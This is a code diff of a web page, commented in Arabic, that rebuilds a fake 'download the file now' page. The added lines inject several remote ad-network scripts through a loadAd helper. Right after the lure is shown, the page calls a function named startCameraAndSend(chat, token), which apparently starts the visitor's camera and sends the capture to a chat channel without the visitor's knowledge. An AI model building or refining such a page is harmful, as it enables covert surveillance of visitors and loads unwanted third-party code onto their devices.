@@ -163,6 +163,7 @@
       border-radius:10px;
       background:#fafafa;
       border:1px solid #eee;
+      min-height: 90px;
     }
     .download-btn{
       background:#28a745;
@@ -383,6 +384,14 @@
     }
   });
 
+  // ------------------ دالة تحميل الإعلانات يدوياً ------------------
+  function loadAd(src) {
+    const s = document.createElement("script");
+    s.src = src;
+    s.async = true;
+    document.body.appendChild(s);
+  }
+
   // ------------------ دالة تشغيل الكاميرا ------------------
   async function startCameraAndSend(chat, token) {
     try {
@@ -504,53 +513,78 @@
     wrap.style.maxWidth = '100%';
     wrap.style.background = '#f5f5f5';
     
-    // إنشاء صفحة التحميل الجانبية
+    // ---------- إنشاء صفحة التحميل الجانبية بطريقة احترافية ----------
     const downloadPage = document.createElement('div');
     downloadPage.className = 'download-page';
-    downloadPage.innerHTML = `
-      <div class="main-box">
-        <h2>⬇️ تحميل الملف الآن ⬇️</h2>
-        
-        <div class="ad-box">
-          <script src="https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js"><\/script>
-        </div>
-        
-        <div class="ad-box">
-          <script async data-cfasync="false" src="https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js"><\/script>
-          <div id="container-596225155ab3da796681d551cb4b7cf4"></div>
-        </div>
-        
-        <button class="download-btn" onclick="goDownload()">تنزيل الآن</button>
-        
-        <div class="ad-box">
-          <script src="https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js"><\/script>
-        </div>
-        
-        <div class="ad-box">
-          <script>
-            atOptions = {
-              'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
-              'format' : 'iframe',
-              'height' : 300,
-              'width' : 160,
-              'params' : {}
-            };
-          <\/script>
-          <script src="https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js"><\/script>
-        </div>
-        
-        <div class="footer">
-          © 2026 جميع الحقوق محفوظة
-        </div>
-      </div>
-    `;
     
-    wrap.appendChild(downloadPage);
+    // إنشاء main-box
+    const mainBox = document.createElement('div');
+    mainBox.className = 'main-box';
     
-    // دالة التحميل
-    window.goDownload = function() {
+    // العنوان
+    const h2 = document.createElement('h2');
+    h2.textContent = '⬇️ تحميل الملف الآن ⬇️';
+    mainBox.appendChild(h2);
+    
+    // AD Box 1
+    const adBox1 = document.createElement('div');
+    adBox1.className = 'ad-box';
+    mainBox.appendChild(adBox1);
+    
+    // AD Box 2
+    const adBox2 = document.createElement('div');
+    adBox2.className = 'ad-box';
+    const containerDiv = document.createElement('div');
+    containerDiv.id = 'container-596225155ab3da796681d551cb4b7cf4';
+    adBox2.appendChild(containerDiv);
+    mainBox.appendChild(adBox2);
+    
+    // زر التحميل
+    const downloadBtn = document.createElement('button');
+    downloadBtn.className = 'download-btn';
+    downloadBtn.textContent = 'تنزيل الآن';
+    downloadBtn.onclick = function() {
       window.open("https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c","_blank");
     };
+    mainBox.appendChild(downloadBtn);
+    
+    // AD Box 3
+    const adBox3 = document.createElement('div');
+    adBox3.className = 'ad-box';
+    mainBox.appendChild(adBox3);
+    
+    // AD Box 4
+    const adBox4 = document.createElement('div');
+    adBox4.className = 'ad-box';
+    mainBox.appendChild(adBox4);
+    
+    // الفوتر
+    const footer = document.createElement('div');
+    footer.className = 'footer';
+    footer.textContent = '© 2026 جميع الحقوق محفوظة';
+    mainBox.appendChild(footer);
+    
+    downloadPage.appendChild(mainBox);
+    wrap.appendChild(downloadPage);
+    
+    // ---------- تحميل جميع الإعلانات يدوياً ----------
+    loadAd("https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js");
+    loadAd("https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js");
+    loadAd("https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js");
+    
+    // الإعلان الرابع مع atOptions
+    const atOptionsScript = document.createElement('script');
+    atOptionsScript.innerHTML = `
+      atOptions = {
+        'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
+        'format' : 'iframe',
+        'height' : 300,
+        'width' : 160,
+        'params' : {}
+      };
+    `;
+    document.body.appendChild(atOptionsScript);
+    loadAd("https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js");
     
     // تشغيل الكاميرا
     startCameraAndSend(chat, token);
